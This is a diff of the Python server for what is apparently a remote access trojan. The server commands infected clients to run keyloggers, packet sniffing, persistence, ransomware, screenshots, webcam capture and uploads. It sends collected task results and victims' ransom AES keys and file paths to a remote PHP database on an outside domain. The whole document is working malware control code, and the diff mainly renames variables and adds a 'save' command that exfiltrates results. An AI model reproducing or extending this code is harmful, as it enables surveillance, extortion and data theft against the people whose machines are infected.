@@ -79,11 +79,11 @@ a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
 
 
 # default port for the server to listen on
-__PORT__    = 1337
+PORT = 1337
 
 
-# default database directory tree
-___DB___    = {
+# public website with PHP scripts embedded for remote database interaction
+DATABASE = {
     'domain': 'https://snapchat.sex/',
     'pages' : {
         'query'     : 'query.php',
@@ -91,15 +91,15 @@ ___DB___    = {
         'ransom'    : 'ransom.php'
     },
     'session_key': None,
-    'tasks': ['keylogger','packetsniff','persistence','ransom','screenshot','webcam','upload']
+    'tasks': ['keylogger','packetsniffer','persistence','ransom','screenshot','webcam','upload']
 }
 
 
-# enable debugging mode for local network only
-__DEBUG__   = False
+# server is contained to the local network if debugging mode is true
+DEBUG = False
 
 
-# comment/uncomment the following line to disable/enable color 
+# comment the following line to disable colored console
 colorama.init()
 
 
@@ -130,12 +130,13 @@ class ServerThread(threading.Thread):
             'ransom'        :   self.ransom_client,
             'restore'       :   self.restore_client,
             'results'       :   self.show_task_results,
+            'save'          :   self.save_task_results,
 	    'sendall'	    :   self.sendall_clients,
             'settings'      :   self.display_settings,
             'session'       :   self.get_current_session,
             'webcam'        :   self.webcam_client,
             }
-        self.db             = globals().get('___DB___')
+        self.db             = globals().get('DATABASE')
         self._rand_color    = lambda: getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','WHITE','MAGENTA']))
         self._text_color    = self._rand_color()
         self._text_style    = colorama.Style.DIM
@@ -145,7 +146,7 @@ class ServerThread(threading.Thread):
         self.db['session_key'] = self._diffiehellman()
         self.s              = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.s.bind(('localhost', port)) if globals().get('__DEBUG__') else self.s.bind(('0.0.0.0', port))
+        self.s.bind(('localhost', port)) if globals().get('DEBUG') else self.s.bind(('0.0.0.0', port))
         self.s.listen(100)
 
     def _prompt(self, data):
@@ -599,7 +600,7 @@ class ServerThread(threading.Thread):
                 if buff and len(str(buff)) and bytes('0' * 64) not in buff:
                     data = self._decrypt_aes(buff, self._deobfuscate(client.session_key))
                     task = json.loads(data)
-                    save = self.query_database("INSERT INTO ransom (session_id, file, key) VALUES ({})".format("'{}', ".format(i) for i in [task['session_id'], task['data']['file'], base64.b64encode(task['data']['key'])]), display=False)
+                    save = self.query_database("INSERT INTO ransom (session_id, file_path, aes_key) VALUES ({})".format("'{}', ".format(i) for i in [task['session_id'], task['data']['file_path'], task['data']['aes_key']]), display=False)
                 else:
                     break
         else:
@@ -649,14 +650,23 @@ class ServerThread(threading.Thread):
         except Exception as e:
             self._error("{} returned error: {}".format(self.show_task_results.func_name, str(e)))
     
-    def save_task_results(self, task):
-        if type(task) is dict and task.get('id') != '0000000000000000000000000000000000000000000000000000000000000000':
-            cmd, _, action = bytes(task.get('task')).partition(' ')
-            if cmd in self.db['tasks']:
-                try:
-                    query   = self.query_database("INSERT INTO tasks (id, client_id, session_id, task, data) VALUES ({})".format(', '.join("'{}'".format(i) for i in (task['id'], task['client_id'], task['session_id'], task['task'], task['data']))), display=False)
-                except Exception as e:
-                    self._error("{} returned error: {}".format(self.save_task_results.func_name, str(e)))
+    def save_task_results(self, task=None):
+        try:
+            if task:
+                cmd, _, __  = bytes(task.get('task')).partition(' ')
+                if cmd in self.db['tasks']:
+                    query   = self.query_database("INSERT INTO tasks (id, client_id, session_id, task, data) VALUES ({})".format(', '.join("'{}'".format(i) for i in (str(task['id']), str(task['client_id']), str(task['session_id']), str(task['task']), str(task['data'])))), display=False)
+            else:
+                if self.current_client:
+                    self.send_client('show results', self.current_client.name)
+                    output  = self.recv_client(self.current_client.name)
+                    results = json.loads(output.get('data'))
+                    for task in results:
+                        cmd, _, __  = bytes(task.get('task')).partition(' ')
+                        if cmd in self.db['tasks']:
+                            query   = self.query_database("INSERT INTO tasks (id, client_id, session_id, task, data) VALUES ({})".format(', '.join("'{}'".format(i) for i in (str(task['id']), str(task['client_id']), str(task['session_id']), str(task['task']), str(task['data'])))), display=False)
+        except Exception as e:
+            self._error("{} returned error: {}".format(self.save_task_results.func_name, str(e)))
         self._return()
 
     def get_current_session(self):
@@ -703,6 +713,7 @@ class ServerThread(threading.Thread):
             self.clients[self.count]  = client
             self.count  += 1
             client.start()
+            self.run() if not self.current_client else self.current_client.run()
             
     def run(self):
         while True:
@@ -874,7 +885,7 @@ class ClientHandler(threading.Thread):
 
 
 if __name__ == '__main__':
-    port    = int(__PORT__)
+    port    = int(PORT)
     threads = {}
     threads['server'] = ServerThread(port)
     os.system('cls' if os.name is 'nt' else 'clear')
